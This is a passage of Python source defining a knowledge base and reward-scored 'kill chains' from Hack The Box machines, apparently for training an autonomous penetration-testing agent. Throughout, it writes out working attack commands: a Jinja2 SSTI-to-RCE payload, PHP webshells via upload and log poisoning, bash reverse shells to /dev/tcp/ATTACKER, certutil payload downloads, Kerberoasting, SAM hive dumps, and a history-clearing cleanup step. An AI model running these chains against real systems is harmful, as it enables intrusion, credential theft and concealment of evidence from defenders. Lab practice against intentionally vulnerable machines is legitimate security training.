             "reasoning": "PHP code injection in Dolibarr 17.0.0 CRM. Default creds admin:admin common. "
                          "(Source: BoardLight)"},
            {"name": "Apache OFBiz CVE-2023-49070", "commands": ["XML-RPC deserialization"],
             "reasoning": "Pre-auth RCE via XML-RPC deserialization in Apache OFBiz ≤18.12. "
                          "(Source: Bizness)"},
            {"name": "Request Baskets CVE-2023-27163", "commands": ["SSRF via basket forwarding"],
             "reasoning": "SSRF in Request Baskets ≤1.2.1 allows forwarding requests to internal services. "
                          "Use to reach filtered ports. (Source: Sau)"},
            {"name": "Maltrail v0.53 OS Command Injection", "commands": ["curl -d 'username=;cmd' /login"],
             "reasoning": "Unauthenticated command injection on login endpoint. "
                          "(Source: Sau — reached via SSRF)"},
            {"name": "Heartbleed CVE-2014-0160", "commands": ["nmap --script ssl-heartbleed", "heartbleed.py"],
             "reasoning": "Leaks server memory (64KB chunks) containing passwords, session tokens, keys. "
                          "(Source: Valentine — leaked base64 password from memory)"},
            {"name": "ProFTPD mod_copy CVE-2015-3306", "commands": ["SITE CPFR /etc/passwd", "SITE CPTO /var/www/"],
             "reasoning": "Unauthenticated file copy — copy PHP shell to webroot for RCE. "
                          "(Source: MS3 common, also HTB pattern)"},
            {"name": "FTP Anonymous + Webroot Overlap",
             "commands": ["ftp anonymous@target → put shell.aspx → curl http://target/shell.aspx"],
             "reasoning": "When FTP anonymous write maps to web server root, upload webshell via FTP "
                          "and trigger via HTTP. (Source: Devel — FTP to IIS webroot → ASPX shell)"},
            {"name": "Finger Service User Enumeration",
             "commands": ["finger @target", "finger root@target", "finger admin@target"],
             "reasoning": "Legacy finger service (port 79) reveals valid usernames. Feed into SSH brute. "
                          "(Source: Sunday — finger revealed sunny and sammy users)"},
        ],
    },
    "common_tools": {
        "recon": ["nmap", "rustscan", "masscan"],
        "web_enum": ["gobuster", "feroxbuster", "ffuf", "dirb", "wfuzz"],
        "web_vuln": ["sqlmap", "nikto", "wpscan", "nuclei"],
        "exploit": ["msfconsole", "searchsploit", "python3 exploit.py"],
        "privesc": ["linpeas.sh", "winpeas.exe", "linux-exploit-suggester", "PowerUp.ps1"],
        "transfer": ["python3 -m http.server", "certutil -urlcache", "wget", "curl"],
        "shell_upgrade": ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "script /dev/null -c bash"],
        "hash_cracking": ["hashcat", "john", "CrackStation (online)"],
        "network_analysis": ["wireshark", "tshark", "tcpdump"],
    },
}

HTB_KILL_CHAINS: List[KillChain] = [
    KillChain(
        name="htb_web_sqli_to_root",
        description="Web enumeration → SQL injection → shell → Linux privesc",
        target_profile="generic",
        difficulty="medium",
        reasoning="The most common HTB pattern. 80% of boxes start with web. The agent must learn "
                  "the full arc: enumerate → identify vuln → exploit → escalate. Each step builds "
                  "on discoveries from the previous step.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port and service scan",
                          "Always start with comprehensive nmap. Discover ALL services before committing to an attack.",
                          "22/tcp open ssh... 80/tcp open http...", "open"),
            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                          "Enumerate web directories",
                          "Directory bruteforcing reveals hidden endpoints. Use raft-medium for balance of speed and coverage.",
                          "/admin /login /uploads /api", "/"),
            KillChainStep("exploitation", "sqlmap -u 'http://{target}/login' --forms --batch --os-shell",
                          "SQL injection → OS shell",
                          "sqlmap automates SQLi detection and exploitation. --os-shell attempts direct command execution.",
                          "os-shell> ", "os-shell"),
            KillChainStep("privilege_escalation", "find / -perm -4000 -type f 2>/dev/null",
                          "Enumerate SUID binaries for privesc",
                          "SUID binaries running as root are the fastest Linux privesc path. Check GTFOBins for each.",
                          "/usr/bin/python3.8", "python"),
            KillChainStep("closeout", "rm -f /tmp/sqlmap* && history -c", "Clean up sqlmap artifacts",
                          "Remove sqlmap temp files and clear shell history.",
                          "cleaned", "clean"),
        ),
    ),
    KillChain(
        name="htb_file_upload_shell",
        description="File upload bypass → webshell → reverse shell → privesc",
        target_profile="generic",
        difficulty="medium",
        reasoning="File upload vulnerabilities are extremely common. The agent needs to learn "
                  "extension bypass techniques and how to chain file upload into full compromise.",
        total_expected_reward=300.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 80,443,8080 {target}", "Scan web ports",
                          "Focus on web ports. Multiple web ports often mean different applications.",
                          "80/tcp open http... 8080/tcp open http-proxy", "open"),
            KillChainStep("enumeration", "ffuf -u http://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
                          "Fuzz for hidden paths and upload endpoints",
                          "ffuf is faster than gobuster and supports more fuzzing modes.",
                          "/upload /files /images", "upload"),
            KillChainStep("exploitation", "curl -F 'file=@shell.php;filename=shell.php.jpg' http://{target}/upload",
                          "Upload PHP shell with extension bypass",
                          "Many upload filters check only the last extension. .php.jpg may bypass filters while "
                          "Apache processes it as PHP (double extension parsing).",
                          "File uploaded successfully", "uploaded"),
            KillChainStep("exploitation", "curl http://{target}/uploads/shell.php.jpg?cmd=id",
                          "Trigger uploaded webshell",
                          "Access the uploaded file to trigger code execution. Verify with 'id' command.",
                          "uid=33(www-data)", "www-data"),
        ),
    ),
    KillChain(
        name="htb_ad_kerberoast",
        description="Active Directory: Kerberoasting → crack → lateral movement → domain admin",
        target_profile="generic",
        difficulty="hard",
        reasoning="Active Directory attacks are the most valuable pentesting skill for enterprise. "
                  "Kerberoasting is a common attack that extracts crackable hashes from AD. This "
                  "chain teaches the agent about Windows domain attacks — essential for senior-level HTB.",
        total_expected_reward=500.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 88,389,445 {target}", "Scan for AD services",
                          "Kerberos (88), LDAP (389), and SMB (445) indicate Active Directory domain controller.",
                          "88/tcp open kerberos... 389/tcp open ldap... 445/tcp open microsoft-ds", "kerberos"),
            KillChainStep("enumeration", "enum4linux -a {target}", "Enumerate AD domain information",
                          "enum4linux extracts domain info, users, groups, shares via SMB/LDAP null sessions.",
                          "Domain: MEGACORP, Users: administrator, svc_sql, svc_web", "Domain"),
            KillChainStep("exploitation", "GetUserSPNs.py megacorp.local/user:password -request -dc-ip {target}",
                          "Kerberoast service accounts",
                          "Request TGS tickets for service accounts. These tickets are encrypted with "
                          "the service account's password hash and can be cracked offline.",
                          "$krb5tgs$23$*svc_sql*...", "krb5tgs"),
            KillChainStep("privilege_escalation", "hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt",
                          "Crack Kerberos TGS hashes offline",
                          "Kerberos TGS tickets use RC4-HMAC (MD4 hash) which is fast to crack. "
                          "Service accounts often have weak passwords for 'compatibility'.",
                          "svc_sql:Summer2024!", "Summer"),
            KillChainStep("post_exploitation", "psexec.py megacorp.local/svc_sql:Summer2024!@{target}",
                          "Lateral movement with cracked credentials",
                          "PsExec gives remote command execution using cracked credentials. If svc_sql "
                          "is a domain admin or has high privileges, this is game over.",
                          "Microsoft Windows [Version 10...]", "Windows"),
        ),
    ),
    KillChain(
        name="htb_linux_suid_privesc",
        description="Initial shell → SUID enumeration → GTFOBins exploit → root",
        target_profile="generic",
        difficulty="medium",
        reasoning="SUID privilege escalation is the most common Linux privesc method on HTB. "
                  "The agent MUST learn to: (1) always enumerate SUID, (2) check GTFOBins, "
                  "(3) use the specific binary's exploitation technique.",
        total_expected_reward=250.0,
        steps=(
            KillChainStep("privilege_escalation", "find / -perm -4000 -type f 2>/dev/null",
                          "Find all SUID binaries on the system",
                          "SUID bit means the binary runs as its owner. If owned by root, we execute as root. "
                          "This is THE first command to run after getting any Linux shell.",
                          "/usr/bin/python3 /usr/bin/find /usr/bin/vim", "python"),
            KillChainStep("privilege_escalation", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                          "Abuse SUID python3 for root shell",
                          "Python with SUID can call setuid(0) to become root, then spawn a root shell. "
                          "This is a GTFOBins technique. The agent should memorize: python+SUID=root.",
                          "root@target:#", "root@"),
        ),
    ),
    KillChain(
        name="htb_ssti_to_shell",
        description="Server-Side Template Injection → RCE → shell",
        target_profile="generic",
        difficulty="medium",
        reasoning="SSTI is the #2 web exploit after SQLi on HTB. The agent MUST learn to test for "
                  "template injection in ANY user input reflected in the page. {{7*7}}=49 confirms SSTI. "
                  "From there, Jinja2/Twig/Freemarker all have paths to RCE.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("enumeration", "curl -s 'http://{target}/page?name={{7*7}}'",
                          "Test for SSTI by injecting math expression",
                          "If the page reflects '49' instead of '{{7*7}}', template injection is confirmed. "
                          "This is the universal SSTI detection technique — works on ALL template engines.",
                          "Hello 49", "49"),
            KillChainStep("enumeration", "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__}}'",
                          "Enumerate available Python objects for Jinja2 SSTI",
                          "Jinja2 SSTI on Flask gives access to Python internals via config object. "
                          "Navigate the MRO (Method Resolution Order) to find os.popen for RCE.",
                          "os", "os"),
            KillChainStep("exploitation",
                          "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'",
                          "Execute OS command via Jinja2 SSTI",
                          "Chain: config → __class__ → __init__ → __globals__ → os module → popen → RCE. "
                          "This is the standard Jinja2 SSTI-to-RCE path. Memorize this chain.",
                          "uid=33(www-data)", "uid="),
            KillChainStep("exploitation",
                          "curl -s 'http://{target}/page?name={{config.__class__.__init__.__globals__[\"os\"].popen("
                          "\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\").read()}}'",
                          "Upgrade SSTI to reverse shell",
                          "Use SSTI to launch a reverse shell. Bash reverse shell is the most reliable for Linux.",
                          "Connection received", "shell"),
            KillChainStep("privilege_escalation", "sudo -l && find / -perm -4000 2>/dev/null",
                          "Enumerate privesc vectors from www-data shell",
                          "www-data rarely has sudo but ALWAYS check. Then enumerate SUID binaries.",
                          "/usr/bin/python3", "python"),
        ),
    ),
    KillChain(
        name="htb_lfi_log_poison",
        description="Local File Inclusion → Log Poisoning → RCE → shell",
        target_profile="generic",
        difficulty="medium",
        reasoning="LFI + log poisoning is one of the most elegant web attacks. The agent reads a log "
                  "file via LFI, then injects PHP code into the log (via User-Agent header), then "
                  "includes the poisoned log file to trigger code execution. Zero file upload needed.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("enumeration", "curl -s 'http://{target}/page?file=../../../etc/passwd'",
                          "Confirm LFI by reading /etc/passwd",
                          "Path traversal to read /etc/passwd confirms LFI. If this works, we can read "
                          "any file on the system — and more importantly, we can INCLUDE executable files.",
                          "root:x:0:0:", "root:"),
            KillChainStep("enumeration", "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log'",
                          "Confirm we can read Apache access log via LFI",
                          "If we can include the access log, we can poison it with PHP code. "
                          "Apache logs User-Agent headers, which we control.",
                          "GET /", "GET"),
            KillChainStep("exploitation",
                          "curl -s -A '<?php system($_GET[\"cmd\"]); ?>' 'http://{target}/'",
                          "Poison Apache access log with PHP webshell via User-Agent",
                          "The User-Agent header is logged verbatim to access.log. By sending PHP code "
                          "as our User-Agent, we inject executable code into the log file.",
                          "200 OK", "200"),
            KillChainStep("exploitation",
                          "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log&cmd=id'",
                          "Trigger RCE by including the poisoned log file",
                          "Now when LFI includes the access log, PHP parses our injected code and executes "
                          "the 'cmd' parameter. This is a full webshell via log poisoning.",
                          "uid=33(www-data)", "uid="),
            KillChainStep("exploitation",
                          "curl -s 'http://{target}/page?file=../../../var/log/apache2/access.log"
                          "&cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"'",
                          "Upgrade log poison to reverse shell",
                          "Use the log-poisoned webshell to launch a reverse shell for stable access.",
                          "Connection received", "shell"),
        ),
    ),
    KillChain(
        name="htb_windows_token_privesc",
        description="Windows: SeImpersonatePrivilege → Potato attack → SYSTEM",
        target_profile="generic",
        difficulty="hard",
        reasoning="Token impersonation via Potato attacks is THE most common Windows privesc on HTB. "
                  "If whoami /priv shows SeImpersonatePrivilege (which IIS/SQL service accounts ALWAYS have), "
                  "it's instant SYSTEM via PrintSpoofer, JuicyPotato, or GodPotato.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("privilege_escalation", "whoami /priv",
                          "Check current user privileges on Windows",
                          "This is THE FIRST command to run on any Windows shell. SeImpersonatePrivilege = SYSTEM. "
                          "SeBackupPrivilege = read anything. SeRestorePrivilege = write anything.",
                          "SeImpersonatePrivilege Enabled", "SeImpersonate"),
            KillChainStep("privilege_escalation",
                          "certutil -urlcache -split -f http://ATTACKER/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
                          "Transfer PrintSpoofer to target",
                          "certutil is the standard Windows file transfer tool available on all versions. "
                          "PrintSpoofer abuses the Print Spooler service to impersonate SYSTEM token.",
                          "CertUtil: -URLCache command completed", "completed"),
            KillChainStep("privilege_escalation",
                          "C:\\Windows\\Temp\\ps.exe -i -c \"cmd /c whoami\"",
                          "Execute PrintSpoofer for SYSTEM shell",
                          "PrintSpoofer creates a named pipe, triggers the Print Spooler to connect to it, "
                          "impersonates the SYSTEM token, and runs our command as NT AUTHORITY\\SYSTEM.",
                          "nt authority\\system", "system"),
            KillChainStep("post_exploitation",
                          "reg save HKLM\\SAM C:\\Windows\\Temp\\sam && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys",
                          "Dump SAM and SYSTEM registry hives for offline hash extraction",
                          "SAM + SYSTEM hives contain local account password hashes. Extractable with "
                          "secretsdump.py or mimikatz. These are the Windows equivalent of /etc/shadow.",
                          "The operation completed successfully", "completed"),
        ),
    ),
    KillChain(
        name="htb_subdomain_vhost_to_shell",
        description="Virtual host discovery → hidden app → exploit → shell",
        target_profile="generic",
        difficulty="medium",
        reasoning="Many HTB boxes hide applications behind virtual hosts. If gobuster finds nothing on "
                  "the main domain, the agent MUST fuzz for subdomains/vhosts. This is the #1 mistake "
                  "beginners make — giving up after dirbusting when the real app is on a subdomain.",
        total_expected_reward=300.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 80,443 {target}", "Scan web services",
                          "Basic web scan. Check for hostname redirects in HTTP headers — they reveal domain names.",
                          "80/tcp open http... Did not follow redirect to http://target.htb", "http"),
            KillChainStep("enumeration",
                          "ffuf -u http://{target} -H 'Host: FUZZ.target.htb' "
                          "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
                          "Fuzz for virtual host subdomains",
                          "Each virtual host serves different content based on the Host header. "
                          "ffuf with Host header fuzzing discovers hidden applications. -fs 0 filters empty responses.",
                          "dev [Status: 200, Size: 3421]", "dev"),
            KillChainStep("enumeration",
                          "gobuster dir -u http://dev.target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                          "Enumerate the discovered hidden application",
                          "The hidden vhost often has debug endpoints, admin panels, or unfinished features "
                          "with less security. Directory brute force reveals exploitable paths.",
                          "/admin /api /debug /upload", "/"),
            KillChainStep("exploitation", "Exploit the discovered application vulnerability",
                          "Attack the hidden application",
                          "Hidden dev/staging apps often have: debug mode enabled, default creds, "
                          "file upload without filters, or exposed API keys. Exploit the specific vuln found.",
                          "uid=33(www-data)", "uid="),
        ),
    ),
    # ─── HTB Walkthrough-Derived Kill Chains (Phase 7.0) ────────────────
    KillChain(
        name="htb_idor_pcap_creds",
        description="IDOR → PCAP download → cleartext FTP creds → SSH → Linux capabilities → root (Cap)",
        target_profile="generic",
        difficulty="easy",
        reasoning="IDOR on sequential identifiers is extremely common. When you find /data/5, try /data/0. "
                  "PCAP files from packet captures contain cleartext credentials from FTP/HTTP/Telnet. "
                  "Linux capabilities (especially cap_setuid on python) give instant root without needing SUID.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 21,22,80 {target}", "Scan for FTP, SSH, HTTP",
                          "Look for combination of FTP+SSH+HTTP which suggests credential reuse potential.",
                          "21/tcp open ftp... 22/tcp open ssh... 80/tcp open http", "open"),
            KillChainStep("enumeration", "curl http://{target}/data/0",
                          "IDOR: Access other users' data by changing sequential ID to 0",
                          "Web apps using sequential IDs are vulnerable to IDOR. Always try ID=0 for "
                          "the first/admin capture. Download the PCAP file.",
                          "0.pcap", "pcap"),
            KillChainStep("exploitation", "tshark -r 0.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS'",
                          "Extract FTP credentials from PCAP",
                          "FTP transmits credentials in cleartext. tshark/Wireshark can filter FTP auth traffic.",
                          "USER nathan... PASS Buck3tH4TF0RM3!", "PASS"),
            KillChainStep("exploitation", "ssh nathan@{target}",
                          "SSH with leaked FTP credentials (password reuse)",
                          "Credential reuse is the #1 lateral movement technique. FTP password often = SSH password.",
                          "nathan@target:~$", "nathan@"),
            KillChainStep("privilege_escalation", "getcap -r / 2>/dev/null",
                          "Enumerate Linux capabilities for privesc",
                          "Linux capabilities are often overlooked. cap_setuid on python = instant root.",
                          "/usr/bin/python3.8 = cap_setuid", "cap_setuid"),
            KillChainStep("privilege_escalation",
                          "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                          "Exploit python3 cap_setuid for root",
                          "Python with cap_setuid can call os.setuid(0) then spawn root shell.",
                          "root@target:#", "root"),
        ),
    ),
    KillChain(
        name="htb_ssrf_to_rce",
        description="SSRF → filtered internal service → command injection → pager privesc (Sau)",
        target_profile="generic",
        difficulty="medium",
        reasoning="When nmap shows filtered ports, look for SSRF-capable web apps to reach internal "
                  "services. Chain: SSRF proxies to filtered port → find vuln in internal service → "
                  "RCE → shell → sudo binary with pager escape for root.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan — note filtered ports",
                          "CRITICAL: Note ports marked 'filtered'. These are reachable internally. "
                          "If you find an SSRF, you can reach filtered services through the target itself.",
                          "55555/tcp open http... 80/tcp filtered... 8338/tcp filtered", "filtered"),
            KillChainStep("enumeration", "curl -s http://{target}:55555/",
                          "Identify web app on open port (Request Baskets, etc.)",
                          "Check for SSRF-capable applications: proxy services, webhooks, baskets, etc.",
                          "Request Baskets", "Request"),
            KillChainStep("exploitation",
                          "Create basket with forward_url=http://127.0.0.1:80 proxy_response=true",
                          "Configure SSRF proxy to reach filtered internal port",
                          "Create a basket/webhook that forwards requests to the filtered port via localhost.",
                          "Basket created", "created"),
            KillChainStep("exploitation",
                          "curl -d 'username=;bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' http://{target}:55555/BASKET/login",
                          "Command injection on internal service via SSRF",
                          "The internal service (Maltrail) has unauthenticated OS command injection on /login.",
                          "Connection received", "shell"),
            KillChainStep("privilege_escalation", "sudo -l",
                          "Check sudo permissions",
                          "Always check sudo -l. systemctl, journalctl, less, more — all have pager escapes.",
                          "(root) NOPASSWD: /usr/bin/systemctl", "systemctl"),
            KillChainStep("privilege_escalation", "sudo /usr/bin/systemctl status anything → !sh",
                          "Abuse systemctl pager for root shell",
                          "systemctl uses a pager (less) by default. In less, type !sh to spawn a shell. "
                          "Since systemctl runs as root, the spawned shell is root.",
                          "root@target:#", "root"),
        ),
    ),
    KillChain(
        name="htb_ftp_webroot_webshell",
        description="FTP anonymous upload → webshell in IIS/Apache webroot → kernel privesc (Devel)",
        target_profile="generic",
        difficulty="easy",
        reasoning="When FTP anonymous write is enabled AND the FTP root overlaps with the web server "
                  "document root, you can upload a webshell via FTP and trigger it via HTTP. This is "
                  "a classic technique that works on both IIS (ASPX) and Apache (PHP).",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 21,80 {target}", "Scan for FTP + HTTP combo",
                          "FTP + HTTP on the same host = potential webroot overlap. Check for anonymous FTP.",
                          "21/tcp open ftp... 80/tcp open http... Anonymous FTP login allowed", "Anonymous"),
            KillChainStep("enumeration", "ftp {target} → ls",
                          "Check FTP contents — look for web files (iisstart.htm, index.html, etc.)",
                          "If FTP root contains web files, FTP root = web root. Upload = instant webshell.",
                          "iisstart.htm welcome.png", "iisstart"),
            KillChainStep("exploitation",
                          "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx > shell.aspx && "
                          "ftp {target} → put shell.aspx",
                          "Generate and upload ASPX reverse shell via FTP",
                          "For IIS use ASPX, for Apache use PHP. Upload via FTP anonymous write.",
                          "226 Transfer complete", "Transfer complete"),
            KillChainStep("exploitation", "curl http://{target}/shell.aspx",
                          "Trigger webshell via HTTP to get reverse shell",
                          "Access the uploaded file via web server to trigger code execution.",
                          "Connection received... iis apppool\\web", "apppool"),
            KillChainStep("privilege_escalation", "systeminfo → MS11-046 or MS10-059",
                          "Windows kernel exploit for SYSTEM",
                          "IIS app pool user → check systeminfo for OS build → find matching kernel exploit. "
                          "Win7 Build 7600 = MS11-046 (afd.sys). Win2008 = MS10-059.",
                          "nt authority\\system", "system"),
        ),
    ),
    KillChain(
        name="htb_heartbleed_key_recovery",
        description="Heartbleed memory leak → password → encrypted RSA key → SSH → tmux root (Valentine)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Heartbleed (CVE-2014-0160) leaks 64KB chunks of server memory. This can contain "
                  "passwords, session tokens, and encryption keys. Combine leaked password with "
                  "discovered encrypted private key for SSH access.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap --script ssl-heartbleed -p 443 {target}", "Test for Heartbleed",
                          "Heartbleed affects OpenSSL 1.0.1 through 1.0.1f. Nmap has a detection script.",
                          "VULNERABLE: Heartbleed", "VULNERABLE"),
            KillChainStep("enumeration", "gobuster dir -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -k",
                          "Enumerate web directories for hidden files",
                          "Look for /dev, /secret, /keys, /backup directories containing sensitive files.",
                          "/dev/", "/dev"),
            KillChainStep("exploitation", "python3 heartbleed.py {target} -n 100",
                          "Exploit Heartbleed — dump 100 memory chunks",
                          "Run Heartbleed exploit multiple times. Each dump is different. Look for "
                          "base64-encoded strings, passwords, session cookies in leaked memory.",
                          "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBl", "base64"),
            KillChainStep("exploitation",
                          "cat /dev/hype_key | xxd -r -p > hype.key && chmod 600 hype.key && "
                          "openssl rsa -in hype.key -out decrypted.key -passin pass:LEAKED_PASSWORD",
                          "Decrypt hex-encoded RSA key with leaked password",
                          "The key file was hex-encoded. xxd -r -p converts hex to binary. Then decrypt "
                          "the password-protected key using the password leaked from Heartbleed memory.",
                          "writing RSA key", "RSA key"),
            KillChainStep("exploitation", "ssh -i decrypted.key hype@{target}",
                          "SSH login with decrypted private key",
                          "Use the recovered private key for SSH authentication.",
                          "hype@Valentine:~$", "hype@"),
            KillChainStep("privilege_escalation", "tmux -S /.devs/dev_sess",
                          "Attach to root tmux session",
                          "Look for running tmux/screen sessions. Root sessions can be attached to if "
                          "the socket file is world-readable. This gives instant root without any exploit.",
                          "root@Valentine:#", "root@"),
        ),
    ),
    KillChain(
        name="htb_cron_job_abuse",
        description="Web shell discovery → sudo user pivot → writable cron script → root (Bashed)",
        target_profile="generic",
        difficulty="easy",
        reasoning="Directory enumeration finds existing webshells or dev tools. Sudo -l reveals users "
                  "that can be impersonated. Writable cron scripts running as root = root by replacing "
                  "the script content with a reverse shell.",
        total_expected_reward=300.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 80 {target}", "Scan for web services",
                          "Single-port web boxes often have hidden tools in web directories.",
                          "80/tcp open http Apache httpd", "Apache"),
            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                          "Directory brute-force — look for /dev, /cgi-bin, /scripts",
                          "Dev directories may contain debugging tools, phpbash, webshells, or admin panels.",
                          "/dev/", "/dev"),
            KillChainStep("exploitation", "curl http://{target}/dev/phpbash.php",
                          "Access discovered web shell or dev tool",
                          "phpbash.php is a PHP-based interactive shell. Other common finds: adminer.php, "
                          "shell.php, cmd.php. Any web-accessible script gives initial foothold.",
                          "www-data@target:$", "www-data"),
            KillChainStep("privilege_escalation", "sudo -l → sudo -u scriptmanager /bin/bash",
                          "Pivot to user with write access to cron scripts",
                          "sudo -l may reveal another user with NOPASSWD access. Pivot to that user.",
                          "scriptmanager@target:$", "scriptmanager"),
            KillChainStep("privilege_escalation",
                          "echo 'import os; os.system(\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\")' > /scripts/test.py",
                          "Replace cron script with reverse shell",
                          "Scripts in /scripts/ running as root cron can be replaced. Wait for cron execution.",
                          "Connection received... root@target", "root"),
        ),
    ),
    KillChain(
        name="htb_subdomain_cms_exploit",
        description="Subdomain fuzzing → CMS default creds → CVE exploit → config cred leak → SSH → SUID (BoardLight)",
        target_profile="generic",
        difficulty="medium",
        reasoning="When the main site has nothing exploitable, fuzz for subdomains. CMS platforms "
                  "often have default credentials. After initial shell, web app config files contain "
                  "database credentials that are reused for SSH.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 22,80 {target}", "Scan for SSH and HTTP",
                          "Only SSH + HTTP means the attack path is through the web.",
                          "22/tcp open ssh... 80/tcp open http", "open"),
            KillChainStep("enumeration",
                          "ffuf -u http://{target} -H 'Host: FUZZ.board.htb' "
                          "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE",
                          "Fuzz for virtual host subdomains",
                          "Check page source for email/domain hints. Use ffuf with Host header fuzzing.",
                          "crm [Status: 200]", "crm"),
            KillChainStep("exploitation", "Login with default credentials admin:admin",
                          "Try default CMS credentials",
                          "Dolibarr, WordPress, phpMyAdmin — ALWAYS try admin:admin, admin:password first.",
                          "Login successful", "success"),
            KillChainStep("exploitation", "python3 exploit.py http://crm.target admin admin LHOST LPORT",
                          "Exploit CMS vulnerability (CVE-2023-30253 Dolibarr PHP injection)",
                          "After identifying CMS version, search for CVE exploits. Run with credentials.",
                          "www-data shell", "www-data"),
            KillChainStep("privilege_escalation",
                          "cat /var/www/html/conf/conf.php → extract DB credentials",
                          "Extract credentials from web app config files",
                          "Web apps store DB creds in config files. These are often reused for SSH.",
                          "dolibarrowner:serverfun2$2023!!", "pass"),
            KillChainStep("privilege_escalation", "ssh larissa@{target} (with DB password)",
                          "SSH with reused config file credentials",
                          "Password reuse from web app config → SSH is extremely common.",
                          "larissa@BoardLight:~$", "larissa@"),
            KillChainStep("privilege_escalation",
                          "find / -perm -4000 2>/dev/null → enlightenment SUID → CVE-2022-37706",
                          "Exploit SUID binary for root",
                          "Enumerate SUID binaries. Research unknown ones for CVEs.",
                          "root@BoardLight:#", "root"),
        ),
    ),
    KillChain(
        name="htb_api_injection_env_creds",
        description="API enumeration → command injection → .env credential leak → SSH → kernel privesc (TwoMillion)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Modern web apps expose APIs. Enumerate all API endpoints, check for auth bypass, "
                  "and test each parameter for command injection. .env files often contain reused passwords.",
        total_expected_reward=450.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p 22,80 {target}", "Scan for SSH and HTTP",
                          "Web + SSH is the standard HTB combination.",
                          "22/tcp open ssh... 80/tcp open http nginx", "open"),
            KillChainStep("enumeration", "curl -s http://{target}/api/v1 | jq",
                          "Enumerate API endpoints",
                          "Many web apps have undocumented API endpoints. Try /api, /api/v1, /api/docs.",
                          "/api/v1/admin/vpn/generate", "api"),
            KillChainStep("exploitation",
                          "curl -X POST http://{target}/api/v1/admin/vpn/generate "
                          "-d '{\"username\":\"test;id;\"}'",
                          "Test API parameters for command injection",
                          "API endpoints that generate files/configs often pass params to system commands. "
                          "Test with ;id; to confirm command injection.",
                          "uid=33(www-data)", "uid="),
            KillChainStep("exploitation",
                          "Inject reverse shell via command injection",
                          "Upgrade command injection to reverse shell",
                          "Use base64 encoding to avoid special character issues in JSON payload.",
                          "www-data shell", "shell"),
            KillChainStep("privilege_escalation", "cat .env",
                          "Read .env file for database/application credentials",
                          "Web app root directories contain .env files with DB_PASSWORD, API keys, etc.",
                          "DB_PASSWORD=SuperDuperPass123", "PASS"),
            KillChainStep("privilege_escalation", "ssh admin@{target} (with .env password)",
                          "SSH with leaked .env credentials",
                          "Password reuse: DB password = SSH password is extremely common.",
                          "admin@target:~$", "admin@"),
            KillChainStep("privilege_escalation", "uname -r → CVE-2023-0386 OverlayFS",
                          "Kernel exploit for root (OverlayFS/FUSE)",
                          "Ubuntu kernels 5.x-6.2 vulnerable to OverlayFS privesc. Check /var/mail for hints.",
                          "root@target:#", "root"),
        ),
    ),
    KillChain(
        name="htb_metabase_rce_overlayfs",
        description="Subdomain → Metabase CVE-2023-38646 → env var cred leak → SSH → OverlayFS root (Analytics)",
        target_profile="generic",
        difficulty="easy",
        reasoning="Metabase pre-auth RCE via setup-token is a one-shot exploit. Container environments "
                  "leak credentials via environment variables. OverlayFS is a single-command root exploit.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 80 {target}", "Find HTTP redirecting to hostname",
                          "Check for Host header redirects revealing domain names and subdomains.",
                          "HTTP redirect to analytical.htb", "analytical"),
            KillChainStep("enumeration",
                          "ffuf -u http://analytical.htb -H 'Host: FUZZ.analytical.htb' -w subdomains.txt",
                          "Fuzz for subdomains",
                          "data.analytical.htb hosts Metabase — a business intelligence tool.",
                          "data [Status: 200]", "data"),
            KillChainStep("exploitation",
                          "curl http://data.analytical.htb/api/session/properties → extract setup-token → "
                          "POST /api/setup/validate with JDBC H2 payload",
                          "Exploit Metabase CVE-2023-38646 pre-auth RCE",
                          "Setup-token in /api/session/properties enables unauthenticated database setup. "
                          "H2 database JDBC URL allows arbitrary command execution.",
                          "shell as metabase", "shell"),
            KillChainStep("privilege_escalation", "env | grep -i pass",
